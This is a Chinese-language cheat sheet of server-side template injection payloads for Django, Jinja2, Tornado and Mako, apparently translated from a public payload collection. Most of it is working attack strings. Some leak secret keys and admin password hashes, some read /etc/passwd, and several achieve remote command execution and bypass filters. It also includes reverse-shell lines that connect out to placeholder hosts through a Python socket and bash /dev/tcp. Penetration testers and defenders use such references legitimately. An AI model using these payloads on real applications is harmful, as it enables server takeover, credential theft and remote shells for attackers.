# 服务器端模板注入 - Python

> 服务器端模板注入（SSTI）是一种漏洞，当攻击者能够将恶意输入注入到服务器端模板中时，就会导致服务器上的任意代码执行。在 Python 中，SSTI 可以出现在使用诸如 Jinja2、Mako 或 Django 模板等模板引擎的情况下，其中用户输入未经过适当的清理就包含在模板中。

## 概述

- [模板库](#模板库)
- [Django](#django)
    - [Django - 基本注入](#django---基本注入)
    - [Django - 跨站脚本攻击](#django---跨站脚本攻击)
    - [Django - 调试信息泄露](#django---调试信息泄露)
    - [Django - 泄露应用程序的密钥](#django---泄露应用程序的密钥)
    - [Django - 泄露管理站点 URL](#django---泄露管理站点 URL)
    - [Django - 泄露管理员用户名和密码哈希](#django---泄露管理员用户名和密码哈希)
- [Jinja2](#jinja2)
    - [Jinja2 - 基本注入](#jinja2---基本注入)
    - [Jinja2 - 模板格式](#jinja2---模板格式)
    - [Jinja2 - 调试语句](#jinja2---调试语句)
    - [Jinja2 - 转储所有使用的类](#jinja2---转储所有使用的类)
    - [Jinja2 - 转储所有配置变量](#jinja2---转储所有配置变量)
    - [Jinja2 - 读取远程文件](#jinja2---读取远程文件)
    - [Jinja2 - 写入远程文件](#jinja2---写入远程文件)
    - [Jinja2 - 远程命令执行](#jinja2---远程命令执行)
        - [通过强制输出实现盲 RCE](#通过强制输出实现盲 RCE)
        - [通过调用 os.popen().read() 利用 SSTI](#通过调用-ospopenread-利用-ssti)
        - [通过调用 subprocess.Popen 利用 SSTI](#通过调用-subprocesspopen-利用-ssti)
        - [通过调用 Popen 不猜测偏移量利用 SSTI](#通过调用-popen-不猜测偏移量利用-ssti)
        - [通过编写恶意配置文件利用 SSTI](#通过编写恶意配置文件利用-ssti)
    - [Jinja2 - 过滤器绕过](#jinja2---过滤器绕过)
- [Tornado](#tornado)
    - [Tornado - 基本注入](#tornado---基本注入)
    - [Tornado - 远程命令执行](#tornado---远程命令执行)
- [Mako](#mako)
    - [Mako - 远程命令执行](#mako---远程命令执行)
- [参考文献](#参考文献)

## 模板库

| 模板名称 | 有效负载格式 |
| -------- | ---------- |
| Bottle   | `{{ }}`   |
| Chameleon | `${ }`    |
| Cheetah  | `${ }`    |
| Django   | `{{ }}`   |
| Jinja2   | `{{ }}`   |
| Mako     | `${ }`    |
| Pystache | `{{ }}`   |
| Tornado  | `{{ }}`   |

## Django

Django 模板语言默认支持两种渲染引擎：Django 模板（DT）和 Jinja2。Django 模板是一个更简单的引擎。它不允许调用传递对象的方法，并且在 DT 中的 SSTI 影响通常比在 Jinja2 中的要轻。

### Django - 基本注入

```python
{% csrf_token %} # 使用 Jinja2 时会导致错误
{{ 7*7 }}  # 使用 Django 模板时会导致错误
ih0vr{{364|add:733}}d121r # Burp 负载 -> ih0vr1097d121r
```

### Django - 跨站脚本攻击

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### Django - 调试信息泄露

```python
{% debug %}
```

### Django - 泄露应用程序的密钥

```python
{{ messages.storages.0.signer.key }}
```

### Django - 泄露管理站点 URL

```python
{% include 'admin/base.html' %}
```

### Django - 泄露管理员用户名和密码哈希

```powershell
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

---

## Jinja2

[官方网站](https://jinja.palletsprojects.com/)
> Jinja2 是一个功能强大的 Python 模板引擎。它具有完整的 Unicode 支持，可选的集成沙盒执行环境，广泛使用并 BSD 许可。

### Jinja2 - 基本注入

```python
{{4*4}}[[5*5]]
{{7*'7'}} 结果为 7777777
{{config.items()}}
```

Jinja2 被 Python Web 框架如 Django 或 Flask 所使用。
上述注入已在 Flask 应用程序上测试。

### Jinja2 - 模板格式

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
```

### Jinja2 - 调试语句

如果启用了调试扩展，则可以使用 `{% debug %}` 标签来转储当前上下文以及可用的过滤器和测试。这在查看模板中可用的内容而无需设置调试器时非常有用。

```python
<pre>{% debug %}</pre>
```

来源: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### Jinja2 - 转储所有使用的类

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

访问 `__globals__` 和 `__builtins__`:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Jinja2 - 转储所有配置变量

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Jinja2 - 读取远程文件

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File 类
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Jinja2 - 写入远程文件

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Jinja2 - 远程命令执行

监听连接

```bash
nc -lnvp 8000
```

#### Jinja2 - 通过强制输出实现盲 RCE

您可以导入 Flask 函数以从易受攻击的页面返回输出。

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

#### 通过调用 os.popen().read() 利用 SSTI

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

但是，当过滤掉 `__builtins__` 时，以下有效负载是上下文无关的，除了存在于 Jinja2 模板对象中外，不需要任何其他内容：

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

我们可以使用 [@podalirius_](https://twitter.com/podalirius_) 提供的较短有效负载：[python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/)：

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

使用 [objectwalker](https://github.com/p0dalirius/objectwalker) 我们可以从 `lipsum` 中找到到 `os` 模块的路径。这是已知的在 Jinja2 模板中实现 RCE 的最短有效负载：

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

#### 通过调用 subprocess.Popen 利用 SSTI

:warning: 数字 396 将根据应用程序的不同而变化。

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### 通过调用 Popen 不猜测偏移量利用 SSTI

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

[@SecGus](https://twitter.com/SecGus) 简化了有效负载以清理输出并方便命令输入。在另一个 GET 参数中包含一个名为 "input" 的变量，该变量包含您要运行的命令（例如：&input=ls）。

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### 通过编写恶意配置文件利用 SSTI

```python
# 恶意配置
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# 加载恶意配置
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# 连接到恶意主机
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

### Jinja2 - 过滤器绕过

```python
request.__class__
request["__class__"]
```

绕过 `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(["_"*2,"class","_"*2]|join)}}
http://localhost:5000/?exploit={{request|attr(["__","class","__"]|join)}}
http://localhost:5000/?exploit={{request|attr("__class__")}}
http://localhost:5000/?exploit={{request.__class__}}
```

绕过 `[` 和 `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

绕过 `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

通过 [@SecGus](https://twitter.com/SecGus) 绕过大多数常见过滤器（'.'、'_'、'|join'、'['、']'、'mro' 和 'base'）：

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Tornado

### Tornado - 基本注入

```py
{{7*7}}
{{7*'7'}}
```

### Tornado - 远程命令执行

```py
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## Mako

[官方网站](https://www.makotemplates.org/)
> Mako 是一个用 Python 编写的模板库。概念上，Mako 是一种嵌入式 Python（即 Python Server Page）语言，它将组件化的布局和继承的概念提炼出来，产生了一种最直接和灵活的模型，同时保持与 Python 调用和作用域语义的紧密联系。

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Mako - 远程命令执行

这些有效负载允许直接访问 `os` 模块

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

## 参考文献

- [Cheatsheet - Flask & Jinja2 SSTI - phosphore - September 3, 2018](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
- [Exploring SSTI in Flask/Jinja2, Part II - Tim Tomes - March 11, 2016](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
- [Jinja2 template injection filter bypasses - Sebastian Neef - August 28, 2017](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)